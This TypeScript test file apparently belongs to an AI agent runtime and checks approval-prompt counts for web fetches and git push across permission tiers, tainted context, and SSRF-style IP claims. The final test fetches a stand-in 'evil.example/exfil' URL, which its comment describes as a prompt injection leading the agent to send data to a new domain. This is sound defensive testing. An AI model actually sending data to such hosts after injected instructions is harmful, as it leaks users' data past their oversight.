import { describe, expect, it } from 'vitest';
import { z } from 'zod';
import type { PersistedEvent } from '@xm/contracts';
import { newCallId, newSessionId } from '@xm/contracts';
import { MemoryEventStore, ToolRegistry, builtinLayers, defineTool, pureGateway } from '@xm/kernel';
import { EventBus, ScriptedProvider, SessionRuntime, runTurn, textInput } from '@xm/runtime';

/**
 * ── 联网搜索的审批噪音，走完整条真实路径（ADR-0034 / ADR-0035）──
 *
 * `policy-informed-grant.test.ts` 考的是 `evaluate()` 这个纯函数。它绿了只说明判定对，
 * 不说明**用户真的不会再被问**——中间还隔着 `permission.decision` 事件、`reduce` 算出的
 * `grants`、`grantsToRules` 的合成、以及 `turn.ts` 把 `untrustedSince` 传进去这一步。
 * 本项目栽过的跟头正是这一类：规则写对了，但读取端不存在（`SessionState.grants` 从 M0
 * 起就没人读，"本会话都允许"点了等于没点，直到 M1-c 才被发现）。
 *
 * 所以这里断言的是**事件流里到底发出了几条 `permission.request`**——那才是用户真正
 * 看到几个确认框的唯一事实来源。
 *
 * 复现的是用户的真实场景：开着「帮我批准」（= yolo）让小明联网搜索。
 *
 * ADR-0034 只消掉了"**同一个**域名被反复问"。用户第二次报回来的是同一句话：
 * 搜一条今日新闻仍然点了 10+ 次允许——因为一次搜索本来就是 SERP 一次 + 每个结果站
 * 一次，**全是新域名**，一个都没被 ADR-0034 覆盖到。ADR-0035 修的是这一半，
 * 所以本文件第一组用例数的是"0 个框"，不再是"1 个框"。
 */

const ENV = {
  home: '/home/ming',
  appRoot: '/repo',
  dataDir: '/home/ming/.local/share/xiaoming',
};

const fetchTool = () =>
  defineTool({
    name: 'web.fetch',
    group: 'web',
    description: '抓取网页',
    inputSchema: z.strictObject({ url: z.string() }),
    risk: 'medium',
    capabilities: ['net.fetch'],
    // eslint-disable-next-line @typescript-eslint/require-await
    async *execute() {
      yield { kind: 'result' as const, forModel: [{ type: 'text' as const, text: '页面正文' }] };
    },
  });

/** 一个不可撤销的**严重项**工具，用来验证 yolo 的静默是有边界的 */
const pushTool = () =>
  defineTool({
    name: 'git.push',
    group: 'git',
    description: '推送到远端',
    inputSchema: z.strictObject({ remote: z.string() }),
    risk: 'high',
    capabilities: ['git.push'],
    // eslint-disable-next-line @typescript-eslint/require-await
    async *execute() {
      yield { kind: 'result' as const, forModel: [{ type: 'text' as const, text: '已推送' }] };
    },
  });

const callChunks = (name: string, args: Record<string, string>) => {
  const id = newCallId();
  return [
    { kind: 'tool_call_start' as const, id, name },
    { kind: 'tool_call_delta' as const, id, argsJson: JSON.stringify(args) },
    { kind: 'tool_call_end' as const, id },
    { kind: 'stop' as const, reason: 'tool_use' as const },
  ];
};

const targetOf = (_name: string, input: unknown): string => {
  const i = input as { url?: string; remote?: string };
  return i.url ?? i.remote ?? '';
};

const END = { chunks: [{ kind: 'stop', reason: 'end_turn' }] as never };

async function harness({
  tier = 'yolo' as const,
  gateway,
}: { tier?: 'yolo' | 'balanced'; gateway?: unknown } = {}) {
  const store = new MemoryEventStore();
  const runtime = await SessionRuntime.open({
    sessionId: newSessionId(),
    store,
    bus: new EventBus(),
  });
  await runtime.record({
    type: 'session.created',
    payload: { cwd: '/repo', modelRef: 'scripted/scripted-1' },
  });

  const tools = new ToolRegistry();
  tools.register(fetchTool());
  tools.register(pushTool());

  const deps = {
    runtime,
    tools,
    layers: builtinLayers(ENV),
    // 默认 yolo：用户开的是「帮我批准」/「完全访问权限」，两者都映射到它（ADR-0030）
    tier,
    model: 'scripted-1',
    gateway: (gateway ?? pureGateway(targetOf)) as ReturnType<typeof pureGateway>,
    // 用户点的是"本会话都允许"——这是本文件的核心变量
    decide: () => Promise.resolve({ effect: 'allow' as const, scope: 'session' as const }),
  };

  return {
    store,
    sessionId: runtime.sessionId,
    runtime,
    fetch: (url: string): Promise<unknown> =>
      runTurn(
        {
          ...deps,
          provider: new ScriptedProvider({
            turns: [{ chunks: callChunks('web.fetch', { url }) }, END] as never,
          }),
        },
        textInput(`看看 ${url}`),
      ),
    push: (remote: string): Promise<unknown> =>
      runTurn(
        {
          ...deps,
          provider: new ScriptedProvider({
            turns: [{ chunks: callChunks('git.push', { remote }) }, END] as never,
          }),
        },
        textInput(`推到 ${remote}`),
      ),
  };
}

const collect = async (
  store: MemoryEventStore,
  sessionId: ReturnType<typeof newSessionId>,
): Promise<PersistedEvent[]> => {
  const out: PersistedEvent[] = [];
  for await (const e of store.read(sessionId)) out.push(e);
  return out;
};

/**
 * 用户真正看到的确认框：按 target 数出 `permission.request` 的条数。
 *
 * 记的是**原始 URL**，不是规范化之后的 host——`requestOf` 从 claim 原样带出，
 * 归一发生在 `evaluate()` 内部。所以下面断言里出现的是完整地址，
 * 而"同一个域名不再问"靠的正是归一：`https://a.example/1` 上的授权归一成 host
 * `a.example`，于是 `/2`、`/3` 都命中它。
 */
const askedTargets = (events: PersistedEvent[]): string[] =>
  events.flatMap((e) => (e.type === 'permission.request' ? [e.payload.target] : []));

/** 工具真的跑起来了几次 —— 防御失效与降噪成功的区别不能靠"没报错"来判断 */
const ranTools = (events: PersistedEvent[]): number =>
  events.filter((e) => e.type === 'tool.start').length;

describe('联网搜索：「完全访问权限」下一个确认框都不该有（ADR-0035）', () => {
  it('🔴 用户报的原场景：SERP + 5 个各不相同的域名 → permission.request 为 0', async () => {
    /*
     * 这条用例就是那句反馈本身："我仅仅搜索一个今日新闻，就让我至少点击了 10+ 次的
     * 允许授权"。ADR-0034 之后同一个域名不再重复问了，但一次搜索本来就是
     * SERP 一次 + 每个结果站一次，**全是新域名**，于是用户看到的框数几乎没变。
     */
    const h = await harness();

    await h.fetch('https://search.example/q=今日新闻');
    expect(h.runtime.state.untrustedContext).toBeDefined(); // 第一次 fetch 就把自己污染了

    for (const host of ['a.news', 'b.news', 'c.news', 'd.news', 'e.news']) {
      await h.fetch(`https://${host}/story`);
    }

    const events = await collect(h.store, h.sessionId);
    expect(askedTargets(events)).toEqual([]);
    expect(ranTools(events)).toBe(6); // 一个都没被拦下——降噪不等于把工具也一起关掉
  });

  it('🔴 yolo 也只对非严重项静默 —— 污染后 git.push 仍然问一次', async () => {
    const h = await harness();

    await h.fetch('https://search.example/q=x');
    await h.push('origin');

    const events = await collect(h.store, h.sessionId);
    expect(askedTargets(events)).toEqual(['origin']);
  });
});

describe('🔴 解析出的 IP 主张只查 deny，不拿去问用户（ADR-0036）', () => {
  /*
   * 真网关每个 URL 产出两条主张：可读域名（claim A）和解析出的 IP（claim B）。
   * claim B 存在只是为了让 SSRF 的 IP 段规则有东西可匹配（ADR-0028），
   * 但它同时也匹配上 `def.net-fetch` 的 ask——**于是每次联网弹两个框**，
   * 一个域名，一个用户根本无从判断的裸 IP。实测确认过，这是审批噪音的第二个来源。
   *
   * 这里用假网关复刻那两条主张：真网关那条路要 DNS 指向一个可连的公网地址才跑得完，
   * 而"要不要问用户"这件事完全不依赖真的连上去。deny 那一半由
   * `web-fetch-ssrf.test.ts` 用真网关守着。
   */
  const twoClaimGateway = {
    resolve: (_tool: unknown, input: unknown) => {
      const url = (input as { url: string }).url;
      return Promise.resolve({
        input,
        claims: [
          { capability: 'net.fetch' as const, target: url },
          // claim B：解析出的 IP，只查 deny
          { capability: 'net.fetch' as const, target: 'http://93.184.216.34/', checkOnly: true },
        ],
      });
    },
  };

  it('每个 URL 只问一次，问的是域名，不是解析出的 IP', async () => {
    const h = await harness({ tier: 'balanced', gateway: twoClaimGateway });
    await h.fetch('https://example.com/page');

    const asked = askedTargets(await collect(h.store, h.sessionId));
    expect(asked).toEqual(['https://example.com/page']);
  });
});

describe('联网搜索：默认「请求批准」档下的噪音（ADR-0034 / ADR-0035）', () => {
  it('🔴 同一个域名只问一次，之后不再出现确认框', async () => {
    const h = await harness({ tier: 'balanced' });

    await h.fetch('https://a.example/1'); // ① 干净上下文 → 问一次，用户点"本会话都允许"
    expect(h.runtime.state.untrustedContext).toBeDefined(); // 这一次 fetch 把会话污染了

    await h.fetch('https://a.example/2'); // ② 同一个域名 → 不该再问（条件 ④）
    await h.fetch('https://a.example/3'); // ③ 还是不该再问

    const events = await collect(h.store, h.sessionId);
    expect(askedTargets(events)).toEqual(['https://a.example/1']);
    expect(ranTools(events)).toBe(3);
  });

  /*
   * ⚠️ 条件 ④（"批准了污染本身的那条授权也算知情"）的回归护栏**不在这里**，
   * 在 `packages/kernel/tests/policy-informed-grant.test.ts`。
   *
   * 原因值得记下来：这个文件里 `permission.decision` 与紧随其后的 `tool.start`
   * 落在同一毫秒，于是 `grantedAt >= untrustedSince` 恰好成立，**没有条件 ④ 这条用例
   * 照样绿**（反向演练实测过）。真实桌面上用户点一下要几百毫秒，那条缝才会露出来。
   *
   * 换句话说：想在这一层考它，就得能控制两个事件之间的时钟间隔，而那是 `turn.ts`
   * 内部的事，测试拿不到。与其留一条"看起来在守、其实靠巧合通过"的用例，
   * 不如把它放在能精确构造时间戳的纯函数层，这里只保留端到端确实能观察到的东西。
   */
  it('每个**新**域名各问一次 —— 这是有意义的提问，不该被一并消掉', async () => {
    const h = await harness({ tier: 'balanced' });

    await h.fetch('https://a.example/1');
    await h.fetch('https://b.example/1');
    await h.fetch('https://a.example/2'); // 回到已授权的域名，不再问

    const events = await collect(h.store, h.sessionId);
    expect(askedTargets(events)).toEqual(['https://a.example/1', 'https://b.example/1']);
  });

  it('🔴 污染后的新域名是可以当场授权的 ask，不是死路一条（ADR-0035）', async () => {
    /*
     * 原来这里是硬 deny：用户想继续只能去点横幅上的「解除标记」，
     * 那把**整轮**防线一起放倒，比"只允许这一个域名"大得多。
     */
    const h = await harness({ tier: 'balanced' });
    await h.fetch('https://a.example/1'); // 污染
    await h.fetch('https://b.example/1'); // 新域名

    const events = await collect(h.store, h.sessionId);
    expect(askedTargets(events)).toContain('https://b.example/1');
    expect(ranTools(events)).toBe(2); // 用户点了允许，工具真的跑起来了
  });

  it('🔴 授权只对被授权的那个域名生效，不是"从此联网自由"', async () => {
    const h = await harness({ tier: 'balanced' });

    await h.fetch('https://a.example/1');

    const before = askedTargets(await collect(h.store, h.sessionId)).length;
    await h.fetch('https://evil.example/exfil'); // 注入让它往新域名发东西 → 必须再问
    const after = askedTargets(await collect(h.store, h.sessionId));

    expect(after).toHaveLength(before + 1);
    expect(after.at(-1)).toBe('https://evil.example/exfil');
  });
});
